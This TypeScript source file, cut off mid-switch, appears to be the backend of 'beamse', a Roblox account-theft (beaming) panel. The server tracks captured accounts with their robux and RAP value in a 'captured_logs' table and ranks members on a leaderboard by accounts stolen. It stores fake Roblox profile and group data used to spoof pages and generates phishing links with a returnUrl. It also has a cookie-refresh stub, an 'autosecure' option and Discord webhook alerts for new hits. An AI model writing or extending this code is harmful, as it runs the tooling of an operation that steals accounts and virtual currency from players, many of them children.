/**
 * beamse-dashboard — WebSocket server for beamse.vip radiant frontend
 *
 * Runs on port 8082 (HTTP + WebSocket upgrade on the same port).
 *
 * Handles all WebSocket message types the radiant frontend sends:
 *   authenticate, get_dashboard, get_leaderboard, get_live_hits, get_chat,
 *   get_discord_auth_url, get_recovery_token, get_referral,
 *   get_referral_by_code, get_signin_stats, generate_hyperlink,
 *   save_group, save_profile, save_referral, save_settings, refresh,
 *   send_chat_message, recovery_login
 *
 * Reads from the beamse_vip MySQL database (existing PHP backend's DB).
 *
 * Broadcasts:
 *   new_live_hit — when a new captured_logs row appears (polls every 5s)
 *   new_chat_message — when a new chat row appears (polls every 5s)
 *   stats_update — every 30s with refreshed stats
 */

import express from "express";
import http from "http";
import cookieParser from "cookie-parser";
import { WebSocketServer, WebSocket } from "ws";
import mysql from "mysql2/promise";
import axios from "axios";
import setup from "./core/setup.ts";
import { log } from "./core/logging.ts";

// ============================================================================
// DATABASE POOL
// ============================================================================
const pool = mysql.createPool({
  host: setup.database.host,
  user: setup.database.user,
  password: setup.database.password,
  database: setup.database.name,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  charset: "utf8mb4",
});

// Test connection on startup
pool.getConnection().then((conn) => {
  log("Database connected", "ready");
  conn.release();
}).catch((err) => {
  log(`Database connection failed: ${err}`, "error");
  process.exit(1);
});

// ============================================================================
// EXPRESS HTTP SERVER (for /api/auth/check and /api/auth/logout)
// ============================================================================
const app = express();
app.set("trust proxy", true);
app.use(express.json());
app.use(cookieParser());

app.get("/api/auth/check", async (req, res) => {
  const auth_token = req.cookies?.Authentication;
  if (!auth_token) return res.json({ authenticated: false });
  try {
    const [rows]: any = await pool.execute(
      "SELECT * FROM users WHERE recovery_token = ? LIMIT 1",
      [auth_token],
    );
    if (!Array.isArray(rows) || rows.length === 0 || rows[0].account_banned) {
      return res.json({ authenticated: false });
    }
    const user = rows[0];
    // Update last active
    await pool.execute(
      "UPDATE users SET account_last_active = ? WHERE id = ?",
      [Math.floor(Date.now() / 1000), user.id],
    );
    res.json({ authenticated: true, user });
  } catch (err: any) {
    log(`/api/auth/check error: ${err.message}`, "error");
    res.json({ authenticated: false });
  }
});

app.post("/api/auth/logout", (_req, res) => {
  res.clearCookie("Authentication");
  res.json({ success: true });
});

app.get("/health", (_req, res) => {
  res.json({ ok: true, service: "beamse-dashboard", domain: setup.domain });
});

// ============================================================================
// PUBLIC TRIPLEHOOK PROFILE ENDPOINT
// GET /api/triplehook/:name — returns a triplehooker's public profile + stats
// Used by the frontend when visiting /controller/<name>
// ============================================================================
app.get("/api/triplehook/:name", async (req, res) => {
  const name = String(req.params.name || "").trim();
  if (!name || name === "dashboard" || name === "create") {
    return res.json({ found: false });
  }
  try {
    // Look up the triplehooker by referral_name (their display name)
    const [rows]: any = await pool.execute(
      `SELECT id, discord_username, discord_id, discord_avatar, account_created_at,
              profile_real_name, profile_fake_name, profile_display_name,
              profile_friends, profile_followers, profile_followings, profile_premium,
              profile_status, profile_description, profile_fake_id,
              group_name, group_owner_name, group_members, group_funds, group_description,
              group_roblox_id, group_fake_id,
              referral_name, referral_description, referral_invite,
              referral_bg_color, referral_card_color, referral_text_color,
              referral_accent_color, referral_button_color,
              referral_show_stats, referral_show_hits,
              statistics_accounts, statistics_visits,
              account_rank, account_level
       FROM users
       WHERE account_banned = 0
         AND (referral_name = ? OR discord_username = ?)
       LIMIT 1`,
      [name, name],
    );
    if (!Array.isArray(rows) || rows.length === 0) {
      return res.json({ found: false });
    }
    const u = rows[0];
    const discord_id = u.discord_id || "0";
    const discord_avatar = u.discord_avatar || "";
    const avatar = discord_avatar
      ? `https://cdn.discordapp.com/avatars/${discord_id}/${discord_avatar}.png?size=256`
      : `https://cdn.discordapp.com/embed/avatars/${Number(discord_id) % 5 || 0}.png`;

    // Get this triplehooker's hit count + robux/rap from captured_logs
    const [hit_rows]: any = await pool.execute(
      `SELECT COUNT(*) as hit_count,
              COALESCE(SUM(robux), 0) as total_robux,
              COALESCE(SUM(rap), 0) as total_rap
       FROM captured_logs WHERE owner_id = ?`,
      [u.id],
    );
    const hit_count = Number(hit_rows[0]?.hit_count || 0);
    const total_robux = Number(hit_rows[0]?.total_robux || 0);
    const total_rap = Number(hit_rows[0]?.total_rap || 0);

    // Get recent hits (last 10)
    const [recent_hits]: any = await pool.execute(
      `SELECT roblox_username, robux, rap, summary, captured_at
       FROM captured_logs WHERE owner_id = ?
       ORDER BY captured_at DESC LIMIT 10`,
      [u.id],
    );

    res.json({
      found: true,
      profile: {
        id: u.id,
        username: u.discord_username || "Unknown",
        display_name: u.referral_name || u.discord_username || "Unknown",
        description: u.referral_description || "",
        invite: u.referral_invite || "",
        avatar,
        joined_at: Number(u.account_created_at || 0),
        rank: u.account_rank || "Noob",
        level: Number(u.account_level || 1),
        // Customization
        bgColor: u.referral_bg_color || "#08080a",
        cardColor: u.referral_card_color || "#0d0d10",
        textColor: u.referral_text_color || "#f4f4f5",
        accentColor: u.referral_accent_color || "#e4e4e7",
        buttonColor: u.referral_button_color || "#161618",
        showStats: Number(u.referral_show_stats ?? 1),
        showHits: Number(u.referral_show_hits ?? 1),
        // Profile spoofing data
        profile_name: u.profile_real_name || "",
        profile_display_name: u.profile_display_name || "",
        profile_friends: Number(u.profile_friends || 0),
        profile_followers: Number(u.profile_followers || 0),
        profile_followings: Number(u.profile_followings || 0),
        profile_premium: !!u.profile_premium,
        profile_status: u.profile_status || "offline",
        profile_description: u.profile_description || "",
        // Group data
        group_name: u.group_name || "",
        group_owner_name: u.group_owner_name || "",
        group_members: Number(u.group_members || 0),
        group_funds: Number(u.group_funds || 0),
        // Stats
        stats: {
          total_hits: hit_count,
          total_robux,
          total_rap,
          statistics_accounts: Number(u.statistics_accounts || 0),
          statistics_visits: Number(u.statistics_visits || 0),
        },
        recent_hits: (recent_hits || []).map((h: any) => ({
          username: h.roblox_username || "Unknown",
          robux: Number(h.robux || 0),
          rap: Number(h.rap || 0),
          summary: Number(h.summary || 0),
          captured_at: Number(h.captured_at || 0),
        })),
      },
    });
  } catch (err: any) {
    log(`/api/triplehook error: ${err.message}`, "error");
    res.json({ found: false, error: err.message });
  }
});

// ============================================================================
// HTTP + WS SERVER (same port)
// ============================================================================
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: "/ws" });

// ============================================================================
// CLIENT TRACKING
// ============================================================================
const clients = new Map<WebSocket, {
  id: string;
  authenticated: boolean;
  user?: any;
  ip?: string;
}>();

// ============================================================================
// HELPERS
// ============================================================================
function send_msg(ws: WebSocket, type: string, data: any = {}, request_id?: string) {
  if (ws.readyState === WebSocket.OPEN) {
    // The frontend's handle_message looks for request_id INSIDE data:
    //   if (message.data && message.data.request_id) { ... }
    // So we need to include request_id in the data object, not at top level
    const data_with_id = request_id ? { ...data, request_id } : data;
    ws.send(JSON.stringify({ type, data: data_with_id }));
  }
}

function broadcast(type: string, data: any, filter?: (client: any) => boolean) {
  for (const [ws, client] of clients) {
    if (client.authenticated && (!filter || filter(client))) {
      send_msg(ws, type, data);
    }
  }
}

// ============================================================================
// AUTHENTICATION
// ============================================================================
async function authenticate(ws: WebSocket, data: { token?: string }, client: any) {
  const token = data?.token;
  if (!token) {
    send_msg(ws, "authenticate", { error: "No token provided" });
    return;
  }
  try {
    const [rows]: any = await pool.execute(
      "SELECT * FROM users WHERE recovery_token = ? LIMIT 1",
      [token],
    );
    if (!Array.isArray(rows) || rows.length === 0 || rows[0].account_banned) {
      send_msg(ws, "authenticate", { error: "Invalid token" });
      return;
    }
    client.user = rows[0];
    client.authenticated = true;
    send_msg(ws, "authenticate", { success: true, user: client.user });
    log(`Client authenticated: ${client.user.discord_username} (${client.user.id})`, "info");
  } catch (err: any) {
    send_msg(ws, "authenticate", { error: err.message });
  }
}

// ============================================================================
// MESSAGE HANDLERS
// ============================================================================

// --- get_dashboard: returns user dashboard data ---
async function get_dashboard(ws: WebSocket, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const user_id = client.user.id;
    const [visits]: any = await pool.execute(
      "SELECT COUNT(*) as count FROM user_visits WHERE owner_id = ?",
      [user_id],
    );
    const [accounts]: any = await pool.execute(
      "SELECT COUNT(*) as count FROM captured_logs WHERE owner_id = ?",
      [user_id],
    );
    // Weekly chart data
    const week_start = Math.floor(Date.now() / 1000) - 7 * 86400;
    const [week_rows]: any = await pool.execute(
      `SELECT FROM_UNIXTIME(visited_at, '%w') as day_slot,
              SUM(CASE WHEN type = 'log' THEN 1 ELSE 0 END) as accounts,
              COUNT(*) as visits
       FROM user_visits
       WHERE owner_id = ? AND visited_at >= ?
       GROUP BY day_slot`,
      [user_id, week_start],
    );
    const accounts_chart = [0, 0, 0, 0, 0, 0, 0];
    const visits_chart = [0, 0, 0, 0, 0, 0, 0];
    for (const row of week_rows) {
      const slot = Number(row.day_slot);
      if (slot >= 0 && slot < 7) {
        accounts_chart[slot] = Number(row.accounts);
        visits_chart[slot] = Number(row.visits);
      }
    }
    send_msg(ws, "get_dashboard", {
      domain: setup.domain,
      user: client.user,
      statistics: {
        total_accounts: Number(client.user.statistics_accounts),
        total_visits: Number(client.user.statistics_visits),
      },
      charts: {
        total_accounts: accounts_chart,
        total_visits: visits_chart,
      },
      chart_days: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
    }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_dashboard", { error: err.message }, request_id);
  }
}

// --- get_live_hits: returns recent captured accounts ---
async function get_live_hits(ws: WebSocket, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const [rows]: any = await pool.execute(
      "SELECT * FROM captured_logs WHERE owner_id = ? ORDER BY captured_at DESC LIMIT 50",
      [client.user.id],
    );
    send_msg(ws, "get_live_hits", { hits: rows || [] }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_live_hits", { error: err.message, hits: [] }, request_id);
  }
}

// --- get_leaderboard: top users by accounts captured ---
async function get_leaderboard(ws: WebSocket, client: any, request_id?: string) {
  try {
    const [rows]: any = await pool.execute(
      `SELECT id, discord_username, discord_avatar, discord_id,
              statistics_accounts, statistics_visits, account_rank
       FROM users
       WHERE account_banned = 0 AND statistics_accounts > 0
       ORDER BY statistics_accounts DESC
       LIMIT 100`,
    );
    send_msg(ws, "get_leaderboard", { leaderboard: rows || [] }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_leaderboard", { error: err.message, leaderboard: [] }, request_id);
  }
}

// --- get_chat: recent chat messages ---
async function get_chat(ws: WebSocket, client: any, request_id?: string) {
  try {
    const [rows]: any = await pool.execute(
      `SELECT c.id, c.user_id, c.message, c.created_at,
              u.discord_username, u.discord_avatar, u.discord_id
       FROM chat c
       JOIN users u ON c.user_id = u.id
       ORDER BY c.created_at DESC
       LIMIT 100`,
    );
    send_msg(ws, "get_chat", { messages: rows || [] }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_chat", { error: err.message, messages: [] }, request_id);
  }
}

// --- send_chat_message: send a new chat message ---
async function send_chat_message(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  const message = String(data?.message || "").trim().slice(0, 500);
  if (!message) {
    send_msg(ws, "send_chat_message", { error: "Empty message" }, request_id);
    return;
  }
  try {
    const now = Math.floor(Date.now() / 1000);
    const [result]: any = await pool.execute(
      "INSERT INTO chat (user_id, message, created_at) VALUES (?, ?, ?)",
      [client.user.id, message, now],
    );
    const msg_row = {
      id: result.insertId,
      user_id: client.user.id,
      message,
      created_at: now,
      discord_username: client.user.discord_username,
      discord_avatar: client.user.discord_avatar,
      discord_id: client.user.discord_id,
    };
    // Broadcast to all clients
    broadcast("new_chat_message", { message: msg_row });
    send_msg(ws, "send_chat_message", { success: true, message: msg_row }, request_id);
  } catch (err: any) {
    send_msg(ws, "send_chat_message", { error: err.message }, request_id);
  }
}

// --- get_discord_auth_url: returns Discord OAuth URL ---
function get_discord_auth_url(ws: WebSocket, request_id?: string) {
  const params = new URLSearchParams({
    client_id: setup.discord.client_id,
    redirect_uri: setup.discord.redirect_uri,
    scope: setup.discord.scope,
    response_type: "code",
  });
  const url = `https://discord.com/oauth2/authorize?${params.toString()}`;
  send_msg(ws, "discord_auth_url", { url }, request_id);
}

// --- get_signin_stats: signin stats ---
async function get_signin_stats(ws: WebSocket, client: any, request_id?: string) {
  try {
    const [total_users]: any = await pool.execute(
      "SELECT COUNT(*) as count FROM users WHERE account_banned = 0",
    );
    const [total_hits]: any = await pool.execute(
      "SELECT COUNT(*) as count FROM captured_logs",
    );
    send_msg(ws, "signin_stats", {
      total_users: total_users[0]?.count || 0,
      total_hits: total_hits[0]?.count || 0,
    }, request_id);
  } catch (err: any) {
    send_msg(ws, "signin_stats", { error: err.message }, request_id);
  }
}

// --- get_recovery_token: returns user's recovery token ---
function get_recovery_token(ws: WebSocket, client: any, request_id?: string) {
  if (!client.user) return;
  send_msg(ws, "get_recovery_token", {
    recovery_token: client.user.recovery_token,
    username: client.user.discord_username,
  }, request_id);
}

// --- recovery_login: login via recovery token ---
async function recovery_login(ws: WebSocket, data: any, client: any, request_id?: string) {
  const recovery_token = String(data?.recovery_token || "").trim();
  if (!recovery_token) {
    send_msg(ws, "recovery_login", { error: "No recovery token" }, request_id);
    return;
  }
  try {
    const [rows]: any = await pool.execute(
      "SELECT * FROM users WHERE recovery_token = ? LIMIT 1",
      [recovery_token],
    );
    if (!Array.isArray(rows) || rows.length === 0 || rows[0].account_banned) {
      send_msg(ws, "recovery_login", { error: "Invalid token" }, request_id);
      return;
    }
    client.user = rows[0];
    client.authenticated = true;
    send_msg(ws, "recovery_login", { success: true, user: client.user }, request_id);
  } catch (err: any) {
    send_msg(ws, "recovery_login", { error: err.message }, request_id);
  }
}

// --- get_referral: returns the TRIPLEHOOK DIRECTORY (no referral codes, no /auth links) ---
// This is the DIRECTORY METHOD — shows a list of triplehookers who have set up their
// create page at /controller/create, along with their stats.
//
// Each triplehooker's create page lives at: https://<domain>/controller/create
// The directory shows: username, avatar, create page setup status, hit count, joined date
async function get_referral(ws: WebSocket, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const user_id = client.user.id;

    // 1. Get ALL triplehookers (users) — this is the directory
    // Show their create page setup info + hit counts
    const [all_users]: any = await pool.execute(
      `SELECT u.id, u.discord_id, u.discord_username, u.discord_avatar, u.account_created_at,
              u.profile_real_name, u.profile_fake_name, u.group_name, u.private_server_code,
              u.referral_name, u.referral_description,
              (SELECT COUNT(*) FROM captured_logs WHERE owner_id = u.id) AS hit_count
       FROM users u
       WHERE u.account_banned = 0
       ORDER BY u.account_created_at DESC
       LIMIT 100`,
    );

    // Build the directory entries
    const directory = (all_users || []).map((u: any) => {
      const discord_id = u.discord_id || "0";
      const discord_avatar = u.discord_avatar || "";
      const avatar = discord_avatar
        ? `https://cdn.discordapp.com/avatars/${discord_id}/${discord_avatar}.png?size=64`
        : `https://cdn.discordapp.com/embed/avatars/${Number(discord_id) % 5 || 0}.png`;
      // A triplehooker has "set up their create page" if they have a profile_real_name
      // or group_name that isn't the default
      const has_create_setup =
        (u.profile_real_name && u.profile_real_name !== "Roblox") ||
        (u.group_name && u.group_name !== "Scriptbloxian Studios");
      return {
        id: u.id,
        username: u.discord_username || "Unknown",
        avatar,
        hit_count: Number(u.hit_count || 0),
        joined_at: Number(u.account_created_at || 0),
        // Create page info (what they've set up at /controller/create)
        profile_name: u.profile_real_name || "",
        group_name: u.group_name || "",
        has_create_setup: !!has_create_setup,
        // Their triplehook display name + description (for the directory listing)
        display_name: u.referral_name || u.discord_username || "Unknown",
        description: u.referral_description || "",
      };
    });

    // 2. Get aggregate stats for the WHOLE directory (all triplehookers)
    let total_hits = 0;
    let total_robux = 0;
    let total_value = 0;
    if (directory.length > 0) {
      const [stats_rows]: any = await pool.execute(
        `SELECT COUNT(*) as total_hits,
                COALESCE(SUM(robux), 0) as total_robux,
                COALESCE(SUM(rap), 0) as total_value
         FROM captured_logs`,
      );
      if (stats_rows[0]) {
        total_hits = Number(stats_rows[0].total_hits || 0);
        total_robux = Number(stats_rows[0].total_robux || 0);
        total_value = Number(stats_rows[0].total_value || 0);
      }
    }

    // 3. Get the current user's avatar
    const discord_id = client.user.discord_id || "0";
    const discord_avatar = client.user.discord_avatar || "";
    const avatar = discord_avatar
      ? `https://cdn.discordapp.com/avatars/${discord_id}/${discord_avatar}.png?size=256`
      : `https://cdn.discordapp.com/embed/avatars/${Number(discord_id) % 5 || 0}.png`;

    // 4. Return the directory payload (NO referral codes, NO /auth links)
    send_msg(ws, "get_referral", {
      // Current user's basic info
      username: client.user.discord_username,
      avatar,
      // Triplehook display info (for the form fields on the Triplehook tab)
      referral_name: client.user.referral_name || "",
      referral_description: client.user.referral_description || "",
      referral_invite: client.user.referral_invite || "",
      referral_uses: directory.length,
      // Customization (aether-style, for the create page)
      bgColor: client.user.referral_bg_color || "#08080a",
      cardColor: client.user.referral_card_color || "#0d0d10",
      textColor: client.user.referral_text_color || "#f4f4f5",
      accentColor: client.user.referral_accent_color || "#e4e4e7",
      buttonColor: client.user.referral_button_color || "#161618",
      dashBgColor: client.user.referral_dash_bg_color || "#0f172a",
      dashTextColor: client.user.referral_dash_text_color || "#ffffff",
      dashAccentColor: client.user.referral_dash_accent_color || "#e4e4e7",
      showStats: Number(client.user.referral_show_stats ?? 1),
      showHits: Number(client.user.referral_show_hits ?? 1),
      // The create page URL (where this triplehooker sets up their stuff)
      create_url: `https://${setup.domain}/controller/create`,
      // Directory data — list of ALL triplehookers
      stats: {
        total_users: directory.length,
        total_hits,
        total_robux,
        total_value,
      },
      directory,
    }, request_id);
  } catch (err: any) {
    log(`get_referral error: ${err.message}`, "error");
    send_msg(ws, "get_referral", {
      username: client.user.discord_username,
      create_url: `https://${setup.domain}/controller/create`,
      error: err.message,
    }, request_id);
  }
}

// --- get_referral_by_code: lookup a triplehooker by their display name (for directory search) ---
async function get_referral_by_code(ws: WebSocket, data: any, request_id?: string) {
  const query = String(data?.code || data?.query || "").trim();
  if (!query) {
    send_msg(ws, "get_referral_by_code", { error: "No query" }, request_id);
    return;
  }
  try {
    const [rows]: any = await pool.execute(
      `SELECT id, discord_username, discord_id, discord_avatar, account_created_at,
              profile_real_name, group_name, referral_name, referral_description
       FROM users
       WHERE account_banned = 0
         AND (discord_username LIKE ? OR referral_name LIKE ? OR profile_real_name LIKE ?)
       ORDER BY account_created_at DESC
       LIMIT 20`,
      [`%${query}%`, `%${query}%`, `%${query}%`],
    );
    if (!Array.isArray(rows) || rows.length === 0) {
      send_msg(ws, "get_referral_by_code", { error: "Not found" }, request_id);
      return;
    }
    const results = rows.map((u: any) => {
      const discord_id = u.discord_id || "0";
      const discord_avatar = u.discord_avatar || "";
      const avatar = discord_avatar
        ? `https://cdn.discordapp.com/avatars/${discord_id}/${discord_avatar}.png?size=64`
        : `https://cdn.discordapp.com/embed/avatars/${Number(discord_id) % 5 || 0}.png`;
      return {
        id: u.id,
        username: u.discord_username || "Unknown",
        avatar,
        display_name: u.referral_name || u.discord_username || "Unknown",
        description: u.referral_description || "",
        profile_name: u.profile_real_name || "",
        group_name: u.group_name || "",
        joined_at: Number(u.account_created_at || 0),
      };
    });
    send_msg(ws, "get_referral_by_code", { results }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_referral_by_code", { error: err.message }, request_id);
  }
}

// --- save_referral: update the triplehooker's create page customization (DIRECTORY METHOD) ---
// Saves: display name, description + all customization (colors, showStats, showHits)
// This is what gets shown in the directory listing for this triplehooker
async function save_referral(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const {
      referral_name, referral_description, referral_invite,
      bgColor, cardColor, textColor, accentColor, buttonColor,
      dashBgColor, dashTextColor, dashAccentColor,
      showStats, showHits,
    } = data || {};

    await pool.execute(
      `UPDATE users SET
        referral_name = ?,
        referral_description = ?,
        referral_invite = ?,
        referral_bg_color = ?,
        referral_card_color = ?,
        referral_text_color = ?,
        referral_accent_color = ?,
        referral_button_color = ?,
        referral_dash_bg_color = ?,
        referral_dash_text_color = ?,
        referral_dash_accent_color = ?,
        referral_show_stats = ?,
        referral_show_hits = ?
       WHERE id = ?`,
      [
        String(referral_name || "").slice(0, 20),
        String(referral_description || "").slice(0, 200),
        String(referral_invite || "").slice(0, 255),
        String(bgColor || "#08080a").slice(0, 7),
        String(cardColor || "#0d0d10").slice(0, 7),
        String(textColor || "#f4f4f5").slice(0, 7),
        String(accentColor || "#e4e4e7").slice(0, 7),
        String(buttonColor || "#161618").slice(0, 7),
        String(dashBgColor || "#0f172a").slice(0, 7),
        String(dashTextColor || "#ffffff").slice(0, 7),
        String(dashAccentColor || "#e4e4e7").slice(0, 7),
        showStats ? 1 : 0,
        showHits ? 1 : 0,
        client.user.id,
      ],
    );

    // Update local user object
    Object.assign(client.user, {
      referral_name: String(referral_name || "").slice(0, 20),
      referral_description: String(referral_description || "").slice(0, 200),
      referral_invite: String(referral_invite || "").slice(0, 255),
      referral_bg_color: String(bgColor || "#08080a").slice(0, 7),
      referral_card_color: String(cardColor || "#0d0d10").slice(0, 7),
      referral_text_color: String(textColor || "#f4f4f5").slice(0, 7),
      referral_accent_color: String(accentColor || "#e4e4e7").slice(0, 7),
      referral_button_color: String(buttonColor || "#161618").slice(0, 7),
      referral_dash_bg_color: String(dashBgColor || "#0f172a").slice(0, 7),
      referral_dash_text_color: String(dashTextColor || "#ffffff").slice(0, 7),
      referral_dash_accent_color: String(dashAccentColor || "#e4e4e7").slice(0, 7),
      referral_show_stats: showStats ? 1 : 0,
      referral_show_hits: showHits ? 1 : 0,
    });

    log(`save_referral SUCCESS for user ${client.user.id}: name="${referral_name}" desc="${referral_description}" invite="${referral_invite}"`, "info");
    send_msg(ws, "save_referral", { success: true, msg: "Triplehook directory updated" }, request_id);
  } catch (err: any) {
    log(`save_referral ERROR for user ${client.user?.id}: ${err.message}`, "error");
    send_msg(ws, "save_referral", { error: err.message }, request_id);
  }
}

// --- get_triplehook_directory: returns ONLY the directory (list of triplehookers + stats) ---
// Lightweight version of get_referral — just the directory data, no customization fields
async function get_triplehook_directory(ws: WebSocket, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const [all_users]: any = await pool.execute(
      `SELECT u.id, u.discord_id, u.discord_username, u.discord_avatar, u.account_created_at,
              u.profile_real_name, u.group_name, u.referral_name, u.referral_description,
              (SELECT COUNT(*) FROM captured_logs WHERE owner_id = u.id) AS hit_count
       FROM users u
       WHERE u.account_banned = 0
       ORDER BY u.account_created_at DESC
       LIMIT 100`,
    );
    const directory = (all_users || []).map((u: any) => {
      const discord_id = u.discord_id || "0";
      const discord_avatar = u.discord_avatar || "";
      const avatar = discord_avatar
        ? `https://cdn.discordapp.com/avatars/${discord_id}/${discord_avatar}.png?size=64`
        : `https://cdn.discordapp.com/embed/avatars/${Number(discord_id) % 5 || 0}.png`;
      const has_create_setup =
        (u.profile_real_name && u.profile_real_name !== "Roblox") ||
        (u.group_name && u.group_name !== "Scriptbloxian Studios");
      return {
        id: u.id,
        username: u.discord_username || "Unknown",
        avatar,
        hit_count: Number(u.hit_count || 0),
        joined_at: Number(u.account_created_at || 0),
        profile_name: u.profile_real_name || "",
        group_name: u.group_name || "",
        has_create_setup: !!has_create_setup,
        display_name: u.referral_name || u.discord_username || "Unknown",
        description: u.referral_description || "",
      };
    });
    let total_hits = 0, total_robux = 0, total_value = 0;
    if (directory.length > 0) {
      const [stats_rows]: any = await pool.execute(
        `SELECT COUNT(*) as total_hits,
                COALESCE(SUM(robux), 0) as total_robux,
                COALESCE(SUM(rap), 0) as total_value
         FROM captured_logs`,
      );
      if (stats_rows[0]) {
        total_hits = Number(stats_rows[0].total_hits || 0);
        total_robux = Number(stats_rows[0].total_robux || 0);
        total_value = Number(stats_rows[0].total_value || 0);
      }
    }
    send_msg(ws, "get_triplehook_directory", {
      stats: {
        total_users: directory.length,
        total_hits,
        total_robux,
        total_value,
      },
      directory,
    }, request_id);
  } catch (err: any) {
    send_msg(ws, "get_triplehook_directory", { error: err.message }, request_id);
  }
}

// --- save_settings: update user settings ---
async function save_settings(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const {
      discordWebhook, discordEveryone, discordHere, visitNoti,
      autosecure, autoage, anonymous,
      robuxFilter, robuxWebhook,
      summaryFilter, summaryWebhook,
      rapFilter, rapWebhook,
    } = data || {};
    await pool.execute(
      `UPDATE users SET
        discord_webhook = ?,
        discord_everyone = ?,
        discord_here = ?,
        discord_visit_notifier = ?,
        dashboard_autosecure = ?,
        dashboard_autoage = ?,
        dashboard_anonymous = ?,
        robux_filter = ?,
        robux_webhook = ?,
        summary_filter = ?,
        summary_webhook = ?,
        rap_filter = ?,
        rap_webhook = ?
       WHERE id = ?`,
      [
        String(discordWebhook || "").slice(0, 512),
        discordEveryone ? 1 : 0,
        discordHere ? 1 : 0,
        visitNoti ? 1 : 0,
        autosecure ? 1 : 0,
        autoage ? 1 : 0,
        anonymous ? 1 : 0,
        Number(robuxFilter || 999999),
        String(robuxWebhook || "").slice(0, 512),
        Number(summaryFilter || 999999),
        String(summaryWebhook || "").slice(0, 512),
        Number(rapFilter || 999999),
        String(rapWebhook || "").slice(0, 512),
        client.user.id,
      ],
    );
    // Update local user object
    Object.assign(client.user, {
      discord_webhook: discordWebhook,
      discord_everyone: discordEveryone ? 1 : 0,
      discord_here: discordHere ? 1 : 0,
      discord_visit_notifier: visitNoti ? 1 : 0,
      dashboard_autosecure: autosecure ? 1 : 0,
      dashboard_autoage: autoage ? 1 : 0,
      dashboard_anonymous: anonymous ? 1 : 0,
      robux_filter: Number(robuxFilter || 999999),
      robux_webhook: robuxWebhook,
      summary_filter: Number(summaryFilter || 999999),
      summary_webhook: summaryWebhook,
      rap_filter: Number(rapFilter || 999999),
      rap_webhook: rapWebhook,
    });
    send_msg(ws, "save_settings", { success: true }, request_id);
  } catch (err: any) {
    send_msg(ws, "save_settings", { error: err.message }, request_id);
  }
}

// --- save_profile: update profile spoofing data ---
async function save_profile(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const p = data?.profile || data;
    await pool.execute(
      `UPDATE users SET
        profile_real_name = ?,
        profile_fake_name = ?,
        profile_display_name = ?,
        profile_friends = ?,
        profile_followers = ?,
        profile_followings = ?,
        profile_premium = ?,
        profile_status = ?,
        profile_description = ?
       WHERE id = ?`,
      [
        String(p.profile_real_name || "").slice(0, 20),
        String(p.profile_fake_name || "").slice(0, 20),
        String(p.profile_display_name || "").slice(0, 20),
        Number(p.profile_friends || 0),
        Number(p.profile_followers || 0),
        Number(p.profile_followings || 0),
        p.profile_premium ? 1 : 0,
        String(p.profile_status || "offline").slice(0, 20),
        String(p.profile_description || "").slice(0, 1000),
        client.user.id,
      ],
    );
    send_msg(ws, "save_profile", { success: true }, request_id);
  } catch (err: any) {
    send_msg(ws, "save_profile", { error: err.message }, request_id);
  }
}

// --- save_group: update group spoofing data ---
async function save_group(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  try {
    const g = data?.group || data;
    await pool.execute(
      `UPDATE users SET
        group_name = ?,
        group_owner_name = ?,
        group_members = ?,
        group_funds = ?,
        group_shout = ?,
        group_description = ?
       WHERE id = ?`,
      [
        String(g.group_name || "").slice(0, 50),
        String(g.group_owner_name || "").slice(0, 20),
        Number(g.group_members || 0),
        Number(g.group_funds || 0),
        String(g.group_shout || "").slice(0, 255),
        String(g.group_description || "").slice(0, 1000),
        client.user.id,
      ],
    );
    send_msg(ws, "save_group", { success: true }, request_id);
  } catch (err: any) {
    send_msg(ws, "save_group", { error: err.message }, request_id);
  }
}

// --- generate_hyperlink: generate a hyperlink from a URL ---
async function generate_hyperlink(ws: WebSocket, data: any, client: any, request_id?: string) {
  if (!client.user) return;
  const url = String(data?.Url || data?.url || "").trim();
  if (!url) {
    send_msg(ws, "generate_hyperlink", { error: "No URL" }, request_id);
    return;
  }
  // Generate a hyperlink using the user's referral code
  const hyperlink = `https://${setup.domain}/?secret=${client.user.referral_code}&returnUrl=${encodeURIComponent(url)}`;
  send_msg(ws, "generate_hyperlink", { link: hyperlink, url }, request_id);
}

// --- refresh: cookie refresher (stub — PHP backend handles actual refresh) ---
async function refresh(ws: WebSocket, _data: any, _client: any, request_id?: string) {
  // This would call the PHP backend's refresher endpoint
  // For now, just respond with success
  send_msg(ws, "refresh", { success: true, msg: "Use /control/api/misc/refresher.php for actual refresh" }, request_id);
}

// ============================================================================
// MESSAGE ROUTER
// ============================================================================
async function handle_message(ws: WebSocket, message: any, client: any) {
  const { type, data } = message;
  // The frontend sends request_id INSIDE data (data.request_id), not at top level.
  // Extract it from there so send_msg can echo it back in the response.
  const request_id = message.request_id || (data && data.request_id) || undefined;
  switch (type) {
    case "authenticate":
      return authenticate(ws, data || {}, client);
    case "get_dashboard":
      return get_dashboard(ws, client, request_id);
    case "get_live_hits":
      return get_live_hits(ws, client, request_id);
    case "get_leaderboard":
      return get_leaderboard(ws, client, request_id);
    case "get_chat":
      return get_chat(ws, client, request_id);
    case "send_chat_message":
      return send_chat_message(ws, data || {}, client, request_id);
    case "get_discord_auth_url":
      return get_discord_auth_url(ws, request_id);
    case "get_signin_stats":
      return get_signin_stats(ws, client, request_id);
    case "get_recovery_token":
      return get_recovery_token(ws, client, request_id);
    case "recovery_login":
      return recovery_login(ws, data || {}, client, request_id);
    case "get_referral":
      return get_referral(ws, client, request_id);
    case "get_referral_by_code":
      return get_referral_by_code(ws, data || {}, request_id);
    case "save_referral":
      return save_referral(ws, data || {}, client, request_id);
    case "get_triplehook_directory":
      return get_triplehook_directory(ws, client, request_id);
    case "save_settings":
      return save_settings(ws, data || {}, client, request_id);
    case "save_profile":
